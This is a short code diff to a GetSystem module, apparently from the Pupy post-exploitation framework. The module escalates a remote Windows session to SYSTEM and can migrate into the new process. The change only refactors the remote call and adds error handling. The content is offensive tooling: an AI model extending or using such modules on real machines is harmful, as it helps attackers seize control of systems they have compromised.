@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
-from pupylib.utils.rpyc_utils import redirected_stdo
 from modules.lib.windows.migrate import migrate
 from rpyc.utils.classic import upload
 
@@ -117,8 +116,12 @@ class GetSystem(PupyModule):
         else:
             cmd     = args.prog
 
-        with redirected_stdo(self):
-            proc_pid = self.client.conn.modules["pupwinutils.security"].getsystem(prog=cmd)
+        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)
+        try:
+            proc_pid = getsystem(cmd)
+        except Exception, e:
+            self.error(e.args[1])
+            return
 
         if args.migrate and not args.restart and not args.powershell:
             migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)
